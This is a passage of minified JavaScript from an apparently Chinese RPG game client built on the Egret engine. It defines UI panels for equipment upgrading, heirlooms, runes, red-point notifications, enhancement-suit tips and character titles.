this.skillIcon2:e=v.ExtremeEquipCC.getZhiZunLinkLevelConfig(a),n=v.ExtremeEquipCC.getZhiZunLv(a),i=v.ExtremeEquipCC.getZhiZunEquipLevelConfig(a,n,!0),o=l.GlobalConfig.SkillsConfig[i.skillId],s=g.SkillUtil.getDesc(o),win.open("YupeiSkillTipsWin",g.SkillUtil.getName(o)+("Lv."+i.level),s);break;case this.chainImg2:e=v.ExtremeEquipCC.getZhiZunLinkLevelConfig(a,!0),win.open("YupeiSkillTipsWin",gettext("灵魂锁链")+("Lv."+e.level),e.chainDesc);break;case this.skill:win.open("ExtremeBuffTips")}},e.prototype.undateView=function(){var t=this.curIndex;this.pos=t,this.setRoleId(this.curRole,t)},e.prototype.update=function(){var t=this.curIndex,e=h.SubRoles.ins().getSubRoleByIndex(0),i=e.getEquipByIndex(t),n=i.item.configID;return n?v.ExtremeEquipCC.canOperate(t)?void c.EquipCT.ins().upgradeZhiZunEquip(e.index,t):void m.TipsCT.ins().showTips(gettext("|C:0xff0000&T:材料不足")):void m.TipsCT.ins().showTips(gettext("|C:0xff0000&T:该部位未穿戴装备"))},e.prototype.onListChange=function(t){void 0===t&&(t=null);var e=Number(t.currentTarget.name);this["pos"+this.curIndex].setSelect(!1),this["pos"+e].setSelect(!0),this.curIndex=e;var i=this.curIndex;this.pos=i,this.selectEquip(i)},e.prototype.setRoleId=function(t,e){if(t=t?t:0,this.curRole=t,this.skin){for(var i=(h.SubRoles.ins().getSubRoleByIndex(t),0);i<this.items.length;i++)this.items[i].data=v.ExtremeEquipCC.positions[i],this.items[i].setSelect(this.curIndex==i);e=e?e:this.pos?this.pos:d.EquipPos.WEAPON,this.pos=e,this.selectEquip(e)}},e.prototype.selectEquip=function(t){this.extremeName.source="extreme_name_0"+t;var e=h.SubRoles.ins().getSubRoleByIndex(0),i=v.ExtremeEquipCC.getZhiZunLv(t);if(i)if(i>=v.ExtremeEquipCC.getMaxZhiZunEquipLevel(t)){this.currentState="maxLevel",this.updateBtn.visible=this.cost.parent.visible=!1;var n=l.GlobalConfig.ZhiZunEquipLevel[t][i],a=r.AttributeData.getAttStr1(n.attrs,y.AttributeFormat.FORMAT_0());this.attr0.text=a,this.skillChain0.text=gettext("灵魂锁链Lv.{0}",v.ExtremeEquipCC.getZhiZunLinkLvShow(e.index,t,i));var p=v.ExtremeEquipCC.getSkillName(t);p&&(this.skillIcon0.source=f.SkillCT.ins().getSkillIdIcon(n.skillId),this.skillName0.text=p+"Lv."+i,this.skillIcon2.source=f.SkillCT.ins().getSkillIdIcon(n.skillId))}else{this.currentState="upLevel",this.updateBtn.visible=this.cost.parent.visible=!0;var n=l.GlobalConfig.ZhiZunEquipLevel[t][i+1],c=l.GlobalConfig.ItemConfig[n.materialInfo.id],g=n.materialInfo.count;this.cost.text=c.name;var m=u.BagCT.ins().getBagGoodsCountById(u.BagCT.BAG_TYPE_OTHTER,n.materialInfo.id),C=void 0;m>=g?(C=o.ColorUtil.GREEN_COLOR,this.isItemEnough=!0):(C=o.ColorUtil.RED_COLOR,this.isItemEnough=!1),this.numLabel.textFlow=s.TextFlowMaker.generateTextFlow("<font color="+C+">"+m+"</font><font color="+o.ColorUtil.WHITE_COLOR+">/"+g+"</font> ");var a=r.AttributeData.getAttStr1(n.attrs,y.AttributeFormat.FORMAT_0()),T=void 0,b=void 0;0==i?(b=l.GlobalConfig.ZhiZunEquipLevel[t][1],T=r.AttributeData.getAttStr1(b.attrs,y.AttributeFormat.FORMAT_0())):(b=l.GlobalConfig.ZhiZunEquipLevel[t][i],T=r.AttributeData.getAttStr1(b.attrs,y.AttributeFormat.FORMAT_0())),this.attr0.text=T,this.attr1.text=a,this.skillChain0.text=gettext("灵魂锁链Lv.{0}",v.ExtremeEquipCC.getZhiZunLinkLvShow(e.index,t,i)),this.skillChain1.text=gettext("灵魂锁链Lv.{0}",v.ExtremeEquipCC.getZhiZunLinkLvShow(e.index,t,i+1));var p=v.ExtremeEquipCC.getSkillName(t);p&&(this.skillName1.text=p+"Lv."+(i+1),this.skillIcon2.source=f.SkillCT.ins().getSkillIdIcon(n.skillId),this.skillName0.text=p+"Lv."+i,this.skillIcon0.source=f.SkillCT.ins().getSkillIdIcon(n.skillId))}else{this.currentState="active",this.updateBtn.visible=!0;var b=l.GlobalConfig.ZhiZunEquipLevel[t][1],T=r.AttributeData.getAttStr1(b.attrs,y.AttributeFormat.FORMAT_0());this.attr0.text=T,this.skillChain0.text=gettext("灵魂锁链Lv.1");var p=v.ExtremeEquipCC.getSkillName(t);p?(this.skillName0.text=p+"Lv.1",this.skillIcon0.source=f.SkillCT.ins().getSkillIdIcon(b.skillId),this.skill_0_0.visible=!0):this.skill_0_0.visible=!1;var m=u.BagCT.ins().getBagGoodsCountById(u.BagCT.BAG_TYPE_OTHTER,b.materialInfo.id),c=l.GlobalConfig.ItemConfig[b.materialInfo.id],g=b.materialInfo.count;this.cost.text=c.name;var C=void 0;m>=g?(C=o.ColorUtil.GREEN_COLOR,this.isItemEnough=!0):(C=o.ColorUtil.RED_COLOR,this.isItemEnough=!1),this.numLabel.textFlow=s.TextFlowMaker.generateTextFlow("<font color="+C+">"+m+"</font><font color="+o.ColorUtil.WHITE_COLOR+">/"+g+"</font> ")}l.GlobalConfig.ZhiZunLinkLevel[t]?(this.skill_0_1.visible=!0,this.skill_1_1.visible=!0):(this.skill_0_1.visible=!1,this.skill_1_1.visible=!1),t==d.EquipPos.WEAPON||t==d.EquipPos.CLOTHES?(this.skill_0_0.visible=!0,this.skill_1_0.visible=!0):(this.skill_0_0.visible=!1,this.skill_1_0.visible=!1),this.setEff(t)},e.prototype.setEff=function(t){this.mc1||(this.mc1=new n.MovieClip),this.mc1.parent||this.extreme_eff.addChild(this.mc1),this.mc2||(this.mc2=new n.MovieClip),this.mc2.parent||this.extreme_eff_bottom.addChild(this.mc2),this.mc1.playFile(RES_DIR_EFF+("extrme_eff_0"+t),-1),this.mc2.playFile(RES_DIR_EFF+"extrme_eff_bottom",-1)},e.prototype.getChainAddPower=function(t,e){if(!e)return 0;var i=l.GlobalConfig.ZhiZunEquipLevel[t][e];if(!i)return 0;var n=v.ExtremeEquipCC.getLinkEquipPos(t),o=l.GlobalConfig.ZhiZunLinkLevel[t][n][i.soulLinkLevel];if(!o)return 0;var s=0,a=h.SubRoles.ins().getSubRoleByIndex(this.curRole);if(o.attrs){s+=p.ItemUtil.getAttrPower(o.attrs);for(var r in o.attrs)s+=p.ItemUtil.relatePower(o.attrs[r],a)}var u=o.ex_power?o.ex_power:0;return s=Math.floor(s)+u},Object.defineProperty(e.prototype,"winTitle",{get:function(){return"Extreme_bt"},enumerable:!1,configurable:!0}),e.prototype.tabRp=function(){return!!C.ExtremeEquipRedPoint.ins().redPoint},e.openCheck=function(){var t=T.OpenSystem.ins().checkSysOpen(b.SystemType.extremeEquip);return t||(m.TipsCT.ins().showTips(T.OpenSystem.ins().getNoOpenTips(b.SystemType.extremeEquip)),win.open(w.View_BianQiang,2)),t},e.showCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return T.OpenSystem.ins().checkSysShow(b.SystemType.extremeEquip)},e}(a.BaseView);e.ExtremeEquipPanel=I,window.ExtremeEquipPanel=I,__reflect(I.prototype,"ExtremeEquipPanel",[]),window.ExtremeEquipPanel=I},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HeirloomPanel=void 0;var n=i(49),o=i(1),s=i(17),a=i(0),r=i(15),l=i(13),h=i(31),u=i(67),p=i(12),d=i(2),c=i(149),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.curIndex=0,e}return __extends(e,t),e.getSysId=function(){return-1},e.prototype.skinComplete=function(){this.items=[];for(var t=0;this["pos"+t];)this.items.push(this["pos"+t]),t++},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateItem,c.Heirloom.ins().postHeirloomInfo),observe(this,this.updateItemRp,s.RedPointBaseSys.ins().RpChange),this.addTouchEvent(this.skill0,this.onClick),this.addTouchEvent(this.skill2,this.onClick);for(var i=l.SubRoles.ins().getSubRoleByIndex(0),n=0;n<this.items.length;n++){this.addTouchEvent(this["pos"+n],this.onTap);var o=i.heirloom.getInfoBySolt(n);this["pos"+n].data={pos:n,info:o},this["pos"+n].setSelect(this.curIndex==n)}this.showRole.source="Role_zy"+i.job,this.updateItemRp(),this.showSkill(this.skill0),this.showSkill(this.skill2)},e.prototype.removeDisplay=function(){if(this.skin){this.removeObserve(),this.removeTouchEvent(this.skill0,this.onClick),this.removeTouchEvent(this.skill2,this.onClick);for(var t=0;t<this.items.length;t++)this.removeTouchEvent(this["pos"+t],this.onTap)}},e.prototype.updateItemRp=function(){for(var t,e=0;e<this.items.length;e++)this["pos"+e].setRed(null===(t=c.Heirloom.ins().lvRps[e])||void 0===t?void 0:t.v)},e.prototype.updateItem=function(t){if(t&&t.solt){var e=t.solt-1,i=l.SubRoles.ins().getSubRoleByIndex(0),n=i.heirloom.getInfoBySolt(e);this["pos"+e].data={pos:e,info:n},this.showSkill(this.skill0),this.showSkill(this.skill2)}},e.prototype.showSkill=function(t){var e=l.SubRoles.ins().getSubRoleByIndex(0),i=Number(t.name),o=e.heirloom.getInfoBySolt(i),s=a.GlobalConfig.HeirloomEquipConfig[i+1][1],r=o.lv?!0:!1,u=r?o:s;this["imgIcon"+i].source=u.skillicon+"_png",this["imgIcon"+i].filters=r?null:n.FilterUtil.ARRAY_GRAY_FILTER,this["nameTxt"+i].text=u.skillname||"",this["nameTxt"+i].textColor=r?h.QUALITY_COLOR[5]:14668213},e.prototype.onTap=function(t){var e=Number(t.currentTarget.name);if(0!=this.eTab.selectedIndex||this.curIndex==e){var i=l.SubRoles.ins().getSubRoleByIndex(0),n=i.heirloom.getInfoBySolt(e);if(!n||!n.lv)return;return void win.open("HeirloomEquipTipsWin",l.SubRoles.ins().getSubRoleByIndex(0),e)}this["pos"+this.curIndex].setSelect(!1),this["pos"+e].setSelect(!0),this.curIndex=e,c.Heirloom.ins().uiChangeIdx(this.curIndex)},e.prototype.onClick=function(t){switch(t.currentTarget){case this.skill0:case this.skill2:var e=Number(t.currentTarget.name),i=l.SubRoles.ins().getSubRoleByIndex(0),n=i.heirloom.getInfoBySolt(e),o=a.GlobalConfig.HeirloomEquipConfig[e+1][1],s=n.lv?!0:!1,r=s?n:o,u=s?h.QUALITY_COLOR[5]:14668213,p="|C:"+u+"&T:"+r.skillname+"|";win.open("HeirloomSkillItem",r.skillicon+"_png",p,r.skilldesc,s)}},e.prototype.tabRp=function(){return c.Heirloom.ins().rp.v},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=p.OpenSystem.ins().checkSysOpen(r.SystemType.Heirloom);return i||(d.TipsCT.ins().showTips(p.OpenSystem.ins().getNoOpenTips(r.SystemType.Heirloom)),win.open(u.View_BianQiang,2)),i},e.showCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return p.OpenSystem.ins().checkSysShow(r.SystemType.Heirloom)},e.prototype.clearPanel=function(){this.items=[]},e}(o.BaseView);e.HeirloomPanel=f,window.HeirloomPanel=f,__reflect(f.prototype,"HeirloomPanel",[]),window.HeirloomPanel=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RunePanel=void 0;var n=i(1),o=i(311),s=i(40),a=i(127),r=i(4),l=i(108),h=i(2),u=i(150),p=i(0),d=i(188),c=i(26),f=i(6),g=i(23),m=i(22),v=i(36),y=i(5),C=i(72),T=i(312),b=i(166),w=i(12),I=i(15),_=i(67),S=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.runeList=[],e.curRole=0,e.selectedIndex=-1,e.showImg=[],e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=w.OpenSystem.ins().checkSysOpen(I.SystemType.Rune);return i||(h.TipsCT.ins().showTips(w.OpenSystem.ins().getNoOpenTips(I.SystemType.Rune)),win.open(_.View_BianQiang,2)),i},e.showCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return w.OpenSystem.ins().checkSysShow(I.SystemType.Rune)},e.prototype.skinComplete=function(){var t=u.RuneDataMgr.ins().getRoleRune(this.curRole);for(var e in t)this.runeList.push(this["rune"+e]),this.runeList[e].setPos(t[e],+e),this.addTouchEvent(this.runeList[e],this.onRuneTap);this.addTouchEvent(this.replace,this.onTap),this.addTouchEvent(this.uplevel,this.onTap),this.addTouchEvent(this.eBreakDowm,this.onTap),this.addTouchEvent(this.eBreakCompose,this.onTap),this.cbImg.visible=!1},e.prototype.addDisplay=function(){observe(this,this.onLevelUp,c.ZsCT.ins().postZsData,r.ActorCC.postPowerChange,a.RuneCC.postDelRune),observe(this,this.showRuneRedPoint,g.GameLogic.ins().postRuneShatter,f.BagCT.ins().postItemAdd,f.BagCT.ins().postItemDel,f.BagCT.ins().postItemChange),observe(this,this.onUnlock,a.RuneCC.postUnlock),observe(this,this.onInlayResult,a.RuneCC.equipResult,Ts.upgradeRune),this.setSelectedIndexRule(this.curRole),this.update()},e.prototype.removeDisplay=function(){if(this.skin){for(;this.showImg.length;){var t=this.showImg.pop();egret.Tween.removeTweens(t),t.parent&&t.parent.removeChild(t),PoolMgr.release(t)}this.removeObserve()}},e.prototype.update=function(){this.showRuneRedPoint(),this.eBreakDowm.textFlow=(new egret.HtmlTextParser).parser("<u>"+this.eBreakDowm.text+"</u>"),this.eBreakCompose.textFlow=(new egret.HtmlTextParser).parser("<u>"+this.eBreakCompose.text+"</u>")},e.prototype.onLevelUp=function(){this.showRuneRedPoint()},e.prototype.onInlayResult=function(t){var e=this,i=t.result,n=t.pos;if(i){this.showRuneRedPoint();var o=this.runeList[n];o.setPos(o.data,o.pos),this.updateSelectedEffect();var s=PoolMgr.create(b.TweenImg);this.showImg.push(s),s.source=this.cbImg.source,s.y=this.cbImg.y,s.horizontalCenter=0,this.cbImg.parent.addChild(s),egret.Tween.get(s).to({y:s.y-110},1e3).call(function(){var t=e.showImg.indexOf(s);-1!=t&&(e.showImg.splice(t,1),s.parent&&s.parent.removeChild(s),PoolMgr.release(s))})}},e.prototype.onTap=function(t){if(t&&t.currentTarget)switch(t.currentTarget){case this.replace:var e=this.runeList[this.selectedIndex];win.open("RuneReplaceWin",e.pos,this.curRole,e.data);break;case this.uplevel:this.upgradeRune();break;case this.eBreakDowm:win.open("RuneDecomposePanel");break;case this.eBreakCompose:win.open("RuneSynthesisPanel")}},e.prototype.upgradeRune=function(){return __awaiter(this,void 0,void 0,function(){var t,e;return __generator(this,function(i){switch(i.label){case 0:return(t=p.GlobalConfig.ItemConfig[this.eCur.data.itemConfig.id+1])?[3,1]:(h.TipsCT.ins().showTips(gettext("战纹等级已满无法进行升级")),[3,4]);case 1:return this.eCon.checkEnough()?[4,sendSync(Ts.upgradeRune,{role:this.curRole,pos:this.selectedIndex})]:[3,3];case 2:return e=i.sent().result,e&&this.showRuneRedPoint(),[3,4];case 3:h.TipsCT.ins().showTips(gettext("战纹精华不足，分解战纹可获得战纹精华")),i.label=4;case 4:return[2]}})})},e.prototype.onRuneTap=function(t){var e=t.currentTarget,i=u.RuneDataMgr.ins().getRune(0,e.pos);return i.configID?(e.currentState==o.RuneEnum.open&&this.selectedIndex==e.pos&&win.open("RuneReplaceWin",e.pos,this.curRole,e.data),this.selectedIndex=e.pos,this.updateSelectedEffect(),void this.showRuneRedPoint()):void(u.RuneDataMgr.ins().getRuneStateByPos(e.pos)&&win.open("RuneReplaceWin",e.pos,this.curRole,e.data))},e.prototype.updateSelectedEffect=function(){for(var t=[],e=0,i=this.runeList;e<i.length;e++){var n=i[e],o=n.pos==this.selectedIndex;if(n.setSelected(o),n.data.configID&&(t=m.AttributeData.AttrAddition(t,l.RuneConfigMgr.ins().getAttr(n.data))),o){var s=u.RuneDataMgr.ins().getRuneStateByPos(n.pos),a=u.RuneDataMgr.ins().getRoleRune(0)[n.pos],r=l.RuneConfigMgr.ins().getNextCost(n.data);switch(this.currentState=s&&a.configID?r?"1":"2":"0",this.currentState){case"1":this.eNextAttr.textFlow=y.TextFlowMaker.generateTextFlow1(m.AttributeData.getAttStr1(l.RuneConfigMgr.ins().getAttr(n.data,1),C.AttributeFormat.FORMAT_0())),this.eCon.setConsume({type:0,id:v.MoneyConst.rune,count:r});case"2":this.eCur.setPos(n.data),this.eCurAttr.textFlow=y.TextFlowMaker.generateTextFlow1(m.AttributeData.getAttStr1(l.RuneConfigMgr.ins().getAttr(n.data),C.AttributeFormat.FORMAT_0()))}}}this.eTotalAttr.textFlow=y.TextFlowMaker.generateTextFlow1(m.AttributeData.getAttStr1(t,C.AttributeFormat.FORMAT_0()))},e.prototype.showRuneRedPoint=function(){for(var t=0,e=this.runeList;t<e.length;t++){var i=e[t],n=d.RuneRedPointMgr.ins().checkSingleInlay(this.curRole,i.pos),o=!1;if(!n){var a=i.data;a&&a instanceof s.ItemData&&a.configID>0&&(n=o=d.RuneRedPointMgr.ins().checkSingleUpgrade(a))}i.rp=n,i.pos==this.selectedIndex&&(this.uplevel.eRp.visible=o)}},e.prototype.setSelectedIndexRule=function(t){var e=u.RuneDataMgr.ins().getMinRune(t,!0);if(e)for(var i=0;i<this.runeList.length;i++)if(this.runeList[i].getItemConfig()&&this.runeList[i].getItemConfig().id==e.configID){this.updateSelectedEffect();break}},e.prototype.onUnlock=function(t){this.runeList[t]&&this.runeList[t].setPos(null,t),this.showRuneRedPoint()},e.prototype.tabRp=function(){return T.RuneRP.ins().runeMainRed.v},e.prototype.clearPanel=function(){},e}(n.BaseView);e.RunePanel=S,window.RunePanel=S,__reflect(S.prototype,"RunePanel",[]),window.RunePanel=S},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneDisplay=e.RuneEnum=void 0;var n=i(1),o=i(108),s=i(92),a=i(0),r=i(5),l=i(10),h=i(150),u=i(42),p=-1;window.firstLockPos=p;var d;!function(t){t.open="open",t.lock="lock"}(d=e.RuneEnum||(e.RuneEnum={})),window.RuneEnum=d;var c=function(t){function e(){var e=t.call(this)||this;return e.icon="",e.select=!1,e.pos=-1,e._rp=!1,e._sn_="RuneItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eName.addEventListener(egret.TextEvent.LINK,function(){win.open("FBChallengePanel")
},this),this.setState(),this.setSelected(this.select),this.eRp.visible=this._rp},Object.defineProperty(e.prototype,"rp",{get:function(){return this._rp},set:function(t){this._rp=t,this.eRp&&(this.eRp.visible=this._rp)},enumerable:!1,configurable:!0}),e.prototype.setPos=function(t,e){isNaN(e)||(this.pos=e),t&&(this.data=t,this.setState())},e.prototype.clearData=function(t){void 0===t&&(t=!1),t?this.currentState="lock":this.currentState="open",this.icon="",this.eName&&(this.eName.text=""),this.data=null},e.prototype.setState=function(){if(this.data)if(this.pos>=0?h.RuneDataMgr.ins().getRuneStateByPos(this.pos)?(this.currentState=d.open,p==this.pos&&(p=-1)):(this.currentState=d.lock,0>p&&(p=this.pos)):this.currentState=d.open,this.icon=this.data.configID?l.ItemUtil.getItemSource(this.data.itemConfig):"zhanwen_+",this.data.configID){var t=a.GlobalConfig.ItemConfig[this.data.itemConfig.id];this._itemConfig=t;var e=a.GlobalConfig.RuneNameConfig[l.ItemUtil.getSubType(t)],i=l.ItemUtil.getQuality2(t);this.need=r.TextFlowMaker.generateTextFlow1("|C:"+l.ItemUtil.getQualityColor(i)+"&T:"+e.runeName+"Lv."+t.id%100+"|")}else this.setLockTF(p==this.pos)},e.prototype.setLockTF=function(t){var e=o.RuneConfigMgr.ins().getLockCfg(this.pos);if(t){var i=a.GlobalConfig.FbChallengeConfig[e.lockLv],n=s.SkyLevelModel.ins(),r=n.getNextOpenLevelNew(i.id),l=0;r&&(l=r.layer);var h=gettext("通关通天塔{0}重天{1}层开启",u.StringUtils.NumberToChinese(i.group),l),p='<a href="event:" color="#35e62d"><u>'+h+"</u></a>";this.need=(new egret.HtmlTextParser).parse(p)}else this.need=null},e.prototype.setDataByItemConfig=function(t){if(t){this._itemConfig=t;var e=a.GlobalConfig.RuneNameConfig[l.ItemUtil.getSubType(t)],i=l.ItemUtil.getQuality2(t);t.level&&0!=t.level?this.need=r.TextFlowMaker.generateTextFlow("|C:"+l.ItemUtil.getQualityColor(i)+"&T:"+e.runeName+" Lv."+t.level%100+"|"):this.need=r.TextFlowMaker.generateTextFlow("|C:"+l.ItemUtil.getQualityColor(i)+"&T:"+e.runeName+" Lv.1|"),this.icon=l.ItemUtil.getItemSource(t)}},e.prototype.getItemConfig=function(){return this._itemConfig},e.prototype.setSelected=function(t){this.select=t,this.eSelect&&(this.eSelect.visible=t)},e}(n.BaseView);e.RuneDisplay=c,window.RuneDisplay=c,__reflect(c.prototype,"RuneDisplay",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneRP=void 0;var n=i(14),o=i(17),s=i(13),a=i(6),r=i(40),l=i(23),h=i(150),u=i(188),p=i(127),d=function(t){function e(){var e=t.call(this)||this;return e.runeMainRed=new o.RedPoint,observe(e,e.initRps,s.SubRoles.ins().doSubRole),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initRps=function(){for(var t=this,e=function(e){var n=0,s=h.RuneDataMgr.ins().getRoleRune(n)||[],r=new o.RedPoint(function(){var i=s[e];return t.getRedPoint(n,i,+e)},l.GameLogic.ins().postRuneShatter,a.BagCT.ins().postItemAdd,a.BagCT.ins().postItemDel,a.BagCT.ins().postItemChange,p.RuneCC.postUnlock);i.runeMainRed.addSub(r)},i=this,n=0;8>n;n++)e(n)},e.prototype.getRedPoint=function(t,e,i){if(null==e||null==i)return!1;var n=!1;return n=u.RuneRedPointMgr.ins().checkSingleInlay(t,i),n||e&&e instanceof r.ItemData&&e.configID>0&&(n=u.RuneRedPointMgr.ins().checkSingleUpgrade(e)),n},e}(n.BaseSystem);e.RuneRP=d,window.RuneRP=d,__reflect(d.prototype,"RuneRP",[]),Systemap.RuneRP=function(){return d.ins()},window.RuneRP=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BagEquipIntensifySuitTip=void 0;var n=i(1),o=i(22),s=i(34),a=i(0),r=i(13),l=i(38),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="EquipIntensifySuit",e}return __extends(e,t),e.prototype.addDisplay=function(){this.addTouchEvent(this.close,this.onClick);var t,e,i,n=this.getMinlv(),o=a.GlobalConfig.EnhanceSuitConfig;for(var s in o){if(t||(t=o[s].index),!(n>=o[s].index)){i=o[s].index;break}e=o[s].index}var r=[];if(e)r=o[e].attr;else{e=t;for(var l=0;l<o[e].attr.length;l++)o[e].attr[l].type,r.push({type:o[e].attr[l].type,value:0});e=0}this.curGroup.x=i?85:210,this.nextGroup.visible=i?!0:!1,this.setAttr(this.curAttr,r),this.curNum.text=e+"",i&&(this.nextNum.text=i+"",this.setAttr(this.nextAttr,o[i].attr))},e.prototype.setAttr=function(t,e){for(var i="",n=0;n<e.length;n++){var a=e[n].type||0;i+=""!=o.AttributeData.getAttrStrByType(a)?o.AttributeData.getAttrStrByType(a)+"+":"",i+=(e[n].value||0)/100+"%",i+=a==s.AttributeType.atAtkMin||a==s.AttributeType.atAtkMageMin||a==s.AttributeType.atAtkTaoistMin||a==s.AttributeType.atDef?" - ":"\n"}t.text=i},e.prototype.getMinlv=function(){for(var t,e=r.SubRoles.ins().getSubRoleByIndex(0),i=0;i<l.EquipCT.FOEGE_MAX;i++){var n=e.getEquipByIndex(i);t||(t=n.strengthen),t>n.strengthen&&(t=n.strengthen)}return t||0},e.prototype.onClick=function(){win.close(this)},e}(n.BaseView);e.BagEquipIntensifySuitTip=h,window.BagEquipIntensifySuitTip=h,__reflect(h.prototype,"BagEquipIntensifySuitTip",[]),window.BagEquipIntensifySuitTip=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TitlePanel=void 0;var n=i(18),o=i(24),s=i(8),a=i(19),r=i(5),l=i(1),h=i(22),u=i(0),p=i(6),d=i(10),c=i(7),f=i(35),g=i(2),m=i(315),v=i(128),y=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="TitlePanelSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstTitle.itemRenderer=m.TitleItemRender,this.lstTitle.dataProvider=this.arc=new eui.ArrayCollection,this.lstTitle.addEventListener(egret.Event.CHANGE,this.CHANGE,this),this.addChangingEvent(this.lstTitle,this.onTabTouching);var t=u.GlobalConfig.TitleTaskDirConfig,e=[];for(var i in t){var n=t[i],o=new m.TitleItemRenderVo;o.dir=n.dir,o.dirName=n.dirName,o.selectedIndex=0,e.push(o),-1==f.TaskCT.ins().curTitleTaskId&&(f.TaskCT.ins().curTitleTaskId=u.GlobalConfig.TitleTaskConfig[n.dir[0]].id)}this.arc.replaceAll(e)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateSelected,f.TaskCT.ins().postTitleChange),observe(this,this.updateView,f.TaskCT.ins().postTitleTaskInfo),this.addTouchEndEvent(this.btnShow,this.onClick),this.lstTitle.selectedIndex=0,this.updateCurTitleTaskId(),this.updateSelected(),this.showAllAttrs()},e.prototype.removeDisplay=function(){this.skin&&(this.removeObserve(),this.removeTouchEvent(this.btnShow,this.onClick))},e.prototype.CHANGE=function(t){this.updateCurTitleTaskId(),this.updateSelected()},e.prototype.onTabTouching=function(t){if(2==this.lstTitle.selectedIndex){var e=this.arc.source[this.lstTitle.selectedIndex],i=f.TaskCT.ins().getDirListData(e);if(!i.length)return g.TipsCT.ins().showTips(gettext("尚未获得隐藏称号")),void t.preventDefault()}},e.prototype.updateCurTitleTaskId=function(){var t=this.arc.source[this.lstTitle.selectedIndex],e=f.TaskCT.ins().getDirListData(t),i=e[t.selectedIndex];f.TaskCT.ins().curTitleTaskId=u.GlobalConfig.TitleTaskConfig[i.id].id},e.prototype.updateView=function(){this.updateTitleList(),this.updateSelected(),this.showAllAttrs()},e.prototype.updateSelected=function(){this.showAttr(),this.showBtn()},e.prototype.updateTitleList=function(){for(var t=0;t<this.lstTitle.numChildren;t++){var e=this.lstTitle.getChildAt(t);e&&e.updateDatas()}},e.prototype.showBtn=function(){var t=f.TaskCT.ins().curTitleTaskId,e=u.GlobalConfig.TitleTaskConfig,i=e[t],n=f.TaskCT.ins().getTitleTaskById(t),o=n.value>=i.target,a=1==n.state,r=u.GlobalConfig.TitleConf[i.title];this.showRed.visible=i.target&&o&&!a||!a&&r.activeItemId&&!!p.BagCT.ins().getBagGoodsCountById(p.BagCT.BAG_TYPE_OTHTER,r.activeItemId),o&&a?f.TaskCT.ins().apparelTaskId==n.id?this.btnShow.label=gettext("卸下"):this.btnShow.label=gettext("穿戴"):this.btnShow.label=gettext("激活"),this.timeLab.text="";var l=this.arc.source[this.lstTitle.selectedIndex],h=f.TaskCT.ins().getDirListData(l),d=v.Title.ins().timeDict,g=u.GlobalConfig.TitleTaskConfig[h[l.selectedIndex].id].title,m=d[g];if(m){var y=(s.DateUtils.formatMiniDateTime(m)-c.GameServerCC.serverTime)/1e3;y&&(this.timeLab.text=s.DateUtils.getFormatBySecond(y,s.DateUtils.TIME_FORMAT_1),Timer.start(1e3,0,this.updateTime,this))}},e.prototype.updateTime=function(){var t=this.arc.source[this.lstTitle.selectedIndex],e=f.TaskCT.ins().getDirListData(t),i=v.Title.ins().timeDict[u.GlobalConfig.TitleTaskConfig[e[t.selectedIndex].id].title];if(i){var n=(s.DateUtils.formatMiniDateTime(i)-c.GameServerCC.serverTime)/1e3;return 0>=n?(this.timeLab.text="",void Timer.stop(this.updateTime,this)):void(this.timeLab.text=s.DateUtils.getFormatBySecond(n,s.DateUtils.TIME_FORMAT_1))}},e.prototype.showAllAttrs=function(){var t=o.CommonUtils.getObjectLength(f.TaskCT.ins().totalAttrs);if(0==t)this.allAttr.text=gettext("尚未开启称号");else{var e=o.CommonUtils.objectToArray(f.TaskCT.ins().totalAttrs),i=h.AttributeData.getAttrShowStr(e,": ");this.allAttr.textFlow=r.TextFlowMaker.generateTextFlow(i)}},e.prototype.showAttr=function(){var t=u.GlobalConfig.TitleTaskConfig,e=t[f.TaskCT.ins().curTitleTaskId],i=u.GlobalConfig.TitleConf[e.title],o=f.TaskCT.ins().getTitleTaskById(f.TaskCT.ins().curTitleTaskId);this.titleName.text=e.name,this.titleName.textColor=d.ItemUtil.getQualityColor(i.rare);var s="";if(e.target){var a=o.value<e.target?o.value:e.target,l=o.value<e.target?n.ColorUtil.RED_COLOR_N:n.ColorUtil.GREEN_COLOR_N;s="|C:"+l+"&T:("+a+"/"+e.target+")|"}this.condition.textFlow=r.TextFlowMaker.generateTextFlow(e.desc+s);var p=i.attrs,c=h.AttributeData.getAttrShowStr(p,": ");this.attr.textFlow=r.TextFlowMaker.generateTextFlow(c),this.updateTitleEff(i)},e.prototype.updateTitleEff=function(t){return t.eff?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.titleName.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+t.eff,-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.titleName.visible=!0))},e.prototype.onClick=function(){var t,e=f.TaskCT.ins().getTitleTaskById(f.TaskCT.ins().curTitleTaskId),i=1==e.state;if(i)return 